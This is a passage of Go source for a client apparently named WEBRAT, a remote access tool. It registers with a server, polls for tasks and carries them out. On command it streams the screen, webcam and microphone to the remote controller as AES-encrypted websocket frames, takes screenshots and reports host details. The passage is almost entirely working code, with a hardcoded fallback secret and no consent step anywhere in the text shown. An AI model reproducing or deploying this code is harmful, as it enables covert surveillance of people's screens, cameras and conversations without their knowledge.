		dst := image.NewRGBA(image.Rect(0, 0, width, height))
		draw.ApproxBiLinear.Scale(dst, dst.Bounds(), src, src.Bounds(), draw.Over, &draw.Options{})
		src = dst
	}
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, src, &jpeg.Options{Quality: quality}); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func envInt(key string, def int) int {
	v := os.Getenv(key)
	if v == "" {
		return def
	}
	i, err := strconv.Atoi(v)
	if err != nil || i <= 0 {
		return def
	}
	return i
}

var streamFlag int32

func streamSecret() string {
	if v := os.Getenv("STREAM_SECRET"); v != "" {
		return v
	}
	paths := []string{".env"}
	if exe, err := os.Executable(); err == nil {
		dir := filepath.Dir(exe)
		paths = append(paths, filepath.Join(dir, ".env"))
		paths = append(paths, filepath.Join(dir, "..", ".env"))
	}
	for _, p := range paths {
		b, err := ioutil.ReadFile(p)
		if err != nil {
			continue
		}
		lines := strings.Split(string(b), "\n")
		for _, ln := range lines {
			ln = strings.TrimSpace(ln)
			if strings.HasPrefix(ln, "STREAM_SECRET=") {
				return strings.TrimSpace(strings.TrimPrefix(ln, "STREAM_SECRET="))
			}
		}
	}
	return "webrat-secret"
}

func deriveKey(secret string) []byte {
	h := sha256.Sum256([]byte(secret))
	return h[:]
}

func encryptAESGCM(plain []byte, secret string) (iv []byte, tag []byte, ciphertext []byte, err error) {
	if secret == "" {
		return nil, nil, nil, fmt.Errorf("missing STREAM_SECRET")
	}
	key := deriveKey(secret)
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, nil, nil, err
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		return nil, nil, nil, err
	}
	iv = make([]byte, aead.NonceSize())
	if _, err := rand.Read(iv); err != nil {
		return nil, nil, nil, err
	}
	ct := aead.Seal(nil, iv, plain, nil)
	tagLen := aead.Overhead()
	if len(ct) < tagLen {
		return nil, nil, nil, fmt.Errorf("ciphertext too short")
	}
	tag = ct[len(ct)-tagLen:]
	ciphertext = ct[:len(ct)-tagLen]
	return iv, tag, ciphertext, nil
}

func wsURL(path string) string {
	base := apiBase()
	if strings.HasPrefix(base, "https://") {
		base = "wss://" + strings.TrimPrefix(base, "https://")
	} else if strings.HasPrefix(base, "http://") {
		base = "ws://" + strings.TrimPrefix(base, "http://")
	}
	return strings.TrimRight(base, "/") + path
}

type wsSession struct {
	conn *websocket.Conn
}

func openDeviceWS(dev Device, secret string) (*wsSession, error) {
	dialer := websocket.Dialer{}
	conn, _, err := dialer.Dial(wsURL("/ws/device"), nil)
	if err != nil {
		return nil, err
	}
	hello := map[string]any{"type": "hello", "deviceId": dev.ID, "secret": secret}
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if err := conn.WriteJSON(hello); err != nil {
		_ = conn.Close()
		return nil, err
	}
	return &wsSession{conn: conn}, nil
}

func (s *wsSession) StartKeepAlive() {
	if s == nil || s.conn == nil {
		return
	}
	s.conn.SetReadLimit(1 << 20)
	s.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	s.conn.SetPongHandler(func(string) error {
		s.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})
	go func() {
		for {
			if _, _, err := s.conn.ReadMessage(); err != nil {
				return
			}
		}
	}()
}

func (s *wsSession) WriteJSON(v any) error {
	if s == nil || s.conn == nil {
		return fmt.Errorf("ws not open")
	}
	s.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	return s.conn.WriteJSON(v)
}

func (s *wsSession) CloseGracefully() {
	if s == nil || s.conn == nil {
		return
	}
	deadline := time.Now().Add(1 * time.Second)
	_ = s.conn.WriteControl(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, "bye"), deadline)
	_ = s.conn.Close()
}

func (s *wsSession) Ping() {
	if s == nil || s.conn == nil {
		return
	}
	_ = s.conn.WriteControl(websocket.PingMessage, []byte("p"), time.Now().Add(2*time.Second))
}
func handleTask(dev Device, t Task) {
	_ = updateTask(t.ID, "running", nil)
	switch t.Type {
	case "start_stream":
		atomic.StoreInt32(&streamFlag, 1)
		var pl struct {
			Source        string `json:"source"`
			Display       int    `json:"display"`
			Camera        string `json:"camera"`
			Mic           string `json:"mic"`
			Fps           int    `json:"fps"`
			JpegQuality   int    `json:"jpegQuality"`
			Width         int    `json:"width"`
			Height        int    `json:"height"`
			AudioRate     int    `json:"audioRate"`
			AudioChannels int    `json:"audioChannels"`
			AudioChunkMs  int    `json:"audioChunkMs"`
		}
		_ = json.Unmarshal(t.Payload, &pl)
		if pl.Source == "" {
			pl.Source = "screen"
		}
		if pl.Source == "screen" {
			_ = updateTask(t.ID, "done", map[string]any{"stream": "started", "source": pl.Source, "display": pl.Display})
			go func() {
				fps := pl.Fps
				if fps <= 0 {
					fps = envInt("STREAM_FPS", 2)
				}
				q := pl.JpegQuality
				if q <= 0 {
					q = envInt("STREAM_JPEG_QUALITY", 75)
				}
				w := pl.Width
				if w <= 0 {
					w = envInt("STREAM_WIDTH", 0)
				}
				h := pl.Height
				if h <= 0 {
					h = envInt("STREAM_HEIGHT", 0)
				}
				interval := time.Duration(int(time.Second) / fps)
				if interval < 100*time.Millisecond {
					interval = 100 * time.Millisecond
				}
				secret := streamSecret()
				for atomic.LoadInt32(&streamFlag) == 1 {
					sess, err := openDeviceWS(dev, secret)
					if err != nil {
						fmt.Println("ws dial error:", err)
						time.Sleep(2 * time.Second)
						continue
					}
					sess.StartKeepAlive()
					dynQ := q
					if dynQ < 40 {
						dynQ = 40
					}
					if dynQ > 90 {
						dynQ = 90
					}
					last := time.Now()
					for atomic.LoadInt32(&streamFlag) == 1 {
						start := time.Now()
						if img, err := captureDisplayScaledBytes(pl.Display, dynQ, w, h); err == nil {
							if iv, tag, ct, err := encryptAESGCM(img, secret); err == nil {
								msg := map[string]any{
									"type":       "frame",
									"iv":         base64.StdEncoding.EncodeToString(iv),
									"tag":        base64.StdEncoding.EncodeToString(tag),
									"ciphertext": base64.StdEncoding.EncodeToString(ct),
									"format":     "jpeg",
									"ts":         time.Now().Format(time.RFC3339),
								}
								if err := sess.WriteJSON(msg); err != nil {
									fmt.Println("ws write error:", err)
									break
								}
							}
						}
						elapsed := time.Since(start)
						if elapsed > (interval*8)/10 && dynQ > 40 {
							dynQ -= 5
						} else if elapsed < (interval/3) && dynQ < 90 {
							dynQ += 3
						}
						time.Sleep(interval - time.Since(last))
						last = time.Now()
					}
					sess.CloseGracefully()
				}
			}()
		} else if pl.Source == "camera" {
			_ = updateTask(t.ID, "done", map[string]any{"stream": "started", "source": pl.Source, "camera": pl.Camera})
			go func() {
				fps := pl.Fps
				q := pl.JpegQuality
				w := pl.Width
				h := pl.Height
				cameraStreamWS(dev, pl.Camera, fps, q, w, h)
			}()
		} else if pl.Source == "mic" {
			_ = updateTask(t.ID, "done", map[string]any{"stream": "started", "source": pl.Source, "mic": pl.Mic})
			go func() {
				micStreamWS(dev, pl.Mic, pl.AudioRate, pl.AudioChannels, pl.AudioChunkMs)
			}()
		} else {
			_ = updateTask(t.ID, "error", map[string]string{"error": "unsupported source"})
			return
		}
	case "stop_stream":
		atomic.StoreInt32(&streamFlag, 0)
		_ = updateTask(t.ID, "done", map[string]string{"stream": "stopped"})
	case "snapshot":
		if b64, err := capturePNGBase64(); err == nil {
			_ = updateTask(t.ID, "done", map[string]any{"png_b64": b64, "ts": time.Now().Format(time.RFC3339)})
		} else {
			_ = updateTask(t.ID, "error", map[string]string{"error": "snapshot failed"})
		}
	case "collect_info":
		vm, _ := mem.VirtualMemory()
		hi, _ := host.Info()
		info := map[string]any{
			"hostname":         func() string { h, _ := os.Hostname(); return h }(),
			"goos":             runtime.GOOS,
			"goarch":           runtime.GOARCH,
			"goversion":        runtime.Version(),
			"mem_total":        vm.Total,
			"mem_used":         vm.Used,
			"mem_used_percent": vm.UsedPercent,
			"uptime":           hi.Uptime,
			"platform":         hi.Platform,
			"kernel_version":   hi.KernelVersion,
		}
		_ = updateTask(t.ID, "done", info)
	case "list_sources":
		n := screenshot.NumActiveDisplays()
		displays := make([]map[string]any, 0, n)
		for i := 0; i < n; i++ {
			b := screenshot.GetDisplayBounds(i)
			displays = append(displays, map[string]any{
				"index":  i,
				"name":   fmt.Sprintf("экран %d (%dx%d)", i, b.Dx(), b.Dy()),
				"width":  b.Dx(),
				"height": b.Dy(),
			})
		}
		camNames := listAvicapCams()
		micNames := listWaveInMics()
		result := map[string]any{
			"displays":    displays,
			"microphones": micNames,
			"cameras":     camNames,
			"implemented": []string{"screen", "camera", "mic"},
		}
		_ = updateTask(t.ID, "done", result)
	default:
		_ = updateTask(t.ID, "error", map[string]string{"error": "unknown task"})
	}
}

func main() {
	name := deviceName()
	fmt.Println("WEBRAT client starting: ", name)
	var dev Device
	var err error
	if saved := loadSavedDeviceID(); saved != "" {
		if resp, e := getJSON("/api/devices/" + saved); e == nil && resp.StatusCode < 300 {
			defer resp.Body.Close()
			_ = json.NewDecoder(resp.Body).Decode(&dev)
			fmt.Println("using saved device:", dev.ID)
		} else {
			dev, err = registerDevice(name)
			if err != nil {
				fmt.Println("register error:", err)
				return
			}
			fmt.Println("registered device:", dev.ID)
			saveDeviceID(dev.ID)
		}
	} else {
		dev, err = registerDevice(name)
		if err != nil {
			fmt.Println("register error:", err)
			return
		}
		fmt.Println("registered device:", dev.ID)
		saveDeviceID(dev.ID)
	}
	_ = setStatus(dev.ID, "online")
	defer setStatus(dev.ID, "offline")
	go func() {
		for {
			_, _ = postJSON(fmt.Sprintf("/api/devices/%s/heartbeat", dev.ID), nil)
			time.Sleep(5 * time.Second)
		}
	}()
	for {
		tasks, err := listTasks(dev.ID)
		if err != nil {
			fmt.Println("list tasks error:", err)
			time.Sleep(3 * time.Second)
			continue
		}
		for _, t := range tasks {
			if t.Status == "queued" {
				handleTask(dev, t)
			}
		}
		time.Sleep(2 * time.Second)
	}
}
